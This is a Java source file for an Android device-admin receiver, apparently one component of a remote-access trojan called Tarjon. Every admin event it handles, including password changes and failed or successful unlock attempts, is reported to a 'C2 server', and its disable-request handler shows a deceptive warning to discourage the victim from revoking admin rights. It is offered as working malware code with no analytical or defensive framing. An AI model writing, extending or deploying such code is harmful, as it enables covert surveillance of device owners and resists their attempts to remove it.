package com.tarjon.admin.receivers;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import android.widget.Toast;

import com.tarjon.admin.network.C2Connection;

/**
 * Device Admin Receiver for handling admin-related events
 * Provides additional security and control over the device
 */
public class TarjonDeviceAdminReceiver extends DeviceAdminReceiver {
    private static final String TAG = "DeviceAdminReceiver";
    
    @Override
    public void onEnabled(Context context, Intent intent) {
        Log.d(TAG, "Device admin enabled");
        
        // Notify the C2 server
        C2Connection c2Connection = C2Connection.getInstance(context);
        c2Connection.sendCommandResult("device_admin", "Device admin enabled");
    }
    
    @Override
    public void onDisabled(Context context, Intent intent) {
        Log.d(TAG, "Device admin disabled");
        
        // Notify the C2 server
        C2Connection c2Connection = C2Connection.getInstance(context);
        c2Connection.sendCommandResult("device_admin", "Device admin disabled");
    }
    
    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        // Message shown when user attempts to disable device admin
        return "Disabling device admin will reduce system security and performance. Are you sure you want to continue?";
    }
    
    @Override
    public void onPasswordChanged(Context context, Intent intent) {
        Log.d(TAG, "Password changed");
        
        // Notify the C2 server
        C2Connection c2Connection = C2Connection.getInstance(context);
        c2Connection.sendCommandResult("device_admin", "Device password changed");
    }
    
    @Override
    public void onPasswordFailed(Context context, Intent intent) {
        Log.d(TAG, "Password failed");
        
        // Notify the C2 server
        C2Connection c2Connection = C2Connection.getInstance(context);
        c2Connection.sendCommandResult("device_admin", "Device password attempt failed");
    }
    
    @Override
    public void onPasswordSucceeded(Context context, Intent intent) {
        Log.d(TAG, "Password succeeded");
        
        // Notify the C2 server
        C2Connection c2Connection = C2Connection.getInstance(context);
        c2Connection.sendCommandResult("device_admin", "Device password attempt succeeded");
    }
    
    @Override
    public void onLockTaskModeEntering(Context context, Intent intent, String pkg) {
        Log.d(TAG, "Lock task mode entering: " + pkg);
        
        // Notify the C2 server
        C2Connection c2Connection = C2Connection.getInstance(context);
        c2Connection.sendCommandResult("device_admin", "Lock task mode entered for " + pkg);
    }
    
    @Override
    public void onLockTaskModeExiting(Context context, Intent intent) {
        Log.d(TAG, "Lock task mode exiting");
        
        // Notify the C2 server
        C2Connection c2Connection = C2Connection.getInstance(context);
        c2Connection.sendCommandResult("device_admin", "Lock task mode exited");
    }
    
    @Override
    public void onPasswordExpiring(Context context, Intent intent) {
        Log.d(TAG, "Password expiring");
        
        // Notify the C2 server
        C2Connection c2Connection = C2Connection.getInstance(context);
        c2Connection.sendCommandResult("device_admin", "Device password expiring");
    }
    
    @Override
    public void onProfileProvisioningComplete(Context context, Intent intent) {
        Log.d(TAG, "Profile provisioning complete");
        
        // Notify the C2 server
        C2Connection c2Connection = C2Connection.getInstance(context);
        c2Connection.sendCommandResult("device_admin", "Profile provisioning complete");
    }
}